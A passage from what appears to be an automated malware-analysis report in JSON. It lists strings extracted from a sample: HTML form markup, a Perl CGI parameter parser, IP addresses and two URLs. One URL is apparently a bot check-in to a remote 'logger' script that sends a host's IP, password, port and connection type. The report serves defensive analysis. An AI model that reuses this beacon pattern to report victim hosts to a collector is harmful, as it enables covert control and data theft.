            "                  </table>",
            "                  <br>",
            "                  <br>",
            "                  <br>",
            "                </form>",
            "              </center>",
            "            </div>",
            "          </td>",
            "        </tr>",
            "      </table>",
            "      <p>&nbsp;</p>",
            "    </td>",
            "  </tr>",
            "</table>",
            "</body>",
            "</html>",
            "# Read all CGI vars into an associative array.",
            "sub getcgivars {",
            "    local($in, %in) ;",
            "    local($name, $value) ;",
            "    # First, read entire string of CGI vars into $in",
            "    if ( ($ENV{'REQUEST_METHOD'} eq 'GET') ||",
            "         ($ENV{'REQUEST_METHOD'} eq 'HEAD') ) {",
            "        $in= $ENV{'QUERY_STRING'} ;",
            "    } elsif ($ENV{'REQUEST_METHOD'} eq 'POST') {",
            "        if ($ENV{'CONTENT_TYPE'}=~ m#^application/x-www-form-urlencoded$#i) {",
            "            $ENV{'CONTENT_LENGTH'}",
            "                || &HTMLdie(\"No Content-Length sent with the POST request.\") ;",
            "            read(STDIN, $in, $ENV{'CONTENT_LENGTH'}) ;",
            "        } else { ",
            "            &HTMLdie(\"Unsupported Content-Type: $ENV{'CONTENT_TYPE'}\") ;",
            "        }",
            "    } else {",
            "        &HTMLdie(\"Script was called with unsupported REQUEST_METHOD.\") ;",
            "    }",
            "    ",
            "    # Resolve and unencode name/value pairs into %in",
            "    foreach (split('&', $in)) {",
            "        s/\\+/ /g ;",
            "        ($name, $value)= split('=', $_, 2) ;",
            "        $name=~ s/%(..)/chr(hex($1))/ge ;",
            "        $value=~ s/%(..)/chr(hex($1))/ge ;",
            "        $in{$name}.= \"\\0\" if defined($in{$name}) ;  # concatenate multiple vars",
            "        $in{$name}.= $value ;",
            "    }",
            "    return %in ;",
            "# Die, outputting HTML error page",
            "# If no $title, use a default title",
            "sub HTMLdie {",
            "    local($msg,$title)= @_ ;",
            "    $title || ($title= \"Error Processing Request.\") ;",
            "    print <<EOF ;",
            "Content-type: text/html",
            "<html>",
            "  <head>",
            "    <title>$title</title>",
            " </head>",
            "<body>",
            "<font color=\"FF0000\"><h1>$title</h1></font>",
            "<h3>$msg</h3>",
            "</body>",
            "</html>",
            " exit ;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1",
            "126.0.3.3"
        ],
        "url": [
            "http://localhost/logger/blog.pl",
            "http://rezmond/logger/blog.pl?nick=gayserver&ip=126.0.3.3&ver=3.16me&pass=passwerd&port=12349&ctype=modem&id=bnsipn&request=2"
        ]
    },
    "time": "0:00:00.337380",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
